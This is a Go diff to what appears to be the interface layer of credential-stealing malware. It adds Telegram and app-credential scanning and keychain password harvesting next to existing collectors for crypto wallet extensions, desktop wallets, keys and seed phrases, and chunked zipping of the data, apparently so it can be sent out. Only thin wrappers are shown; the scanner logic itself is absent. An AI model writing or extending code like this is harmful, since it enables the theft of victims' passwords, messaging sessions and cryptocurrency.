@@ -53,7 +53,9 @@ func CollectWalletExtensionBundles() []WalletExtensionBundle {
 func CollectDesktopWalletBundles() []DesktopWalletBundle {
 	return scanner.CollectDesktopWalletBundles()
 }
-func ScanKeys() []KeyResult                 { return scanner.ScanKeys() }
+func ScanTelegram() []TelegramResult    { return scanner.ScanTelegram() }
+func ScanApps() []AppCredentialResult { return scanner.ScanApps() }
+func ScanKeys() []KeyResult           { return scanner.ScanKeys() }
 func FetchFile(path string) ([]byte, error) { return scanner.FetchFile(path) }
 func ZipDirectory(dir string) ([]byte, error) { return ziputil.ZipDirectory(dir) }
 
@@ -69,4 +71,18 @@ func ZipFileEntriesChunked(entries []ZipFileEntry, maxBytes int) ([][]byte, erro
 
 func ScanSeeds(files []FileResult, passwords []PasswordResult, autofill []AutofillResult) []SeedResult {
 	return scanner.ScanSeeds(files, passwords, autofill)
+}
+
+type PasswordCandidateResult = types.PasswordCandidateResult
+
+func CollectKeychainPasswordCandidates() []PasswordCandidateResult {
+	return scanner.CollectKeychainPasswordCandidates()
+}
+
+func BuildPasswordCandidates(passwords []PasswordResult, autofill []AutofillResult, keychain []PasswordCandidateResult) []PasswordCandidateResult {
+	return scanner.BuildPasswordCandidates(passwords, autofill, keychain)
+}
+
+func AppendExtraPasswordCandidates(candidates []PasswordCandidateResult, result *CollectionResult) []PasswordCandidateResult {
+	return scanner.AppendExtraPasswordCandidates(candidates, result)
 }
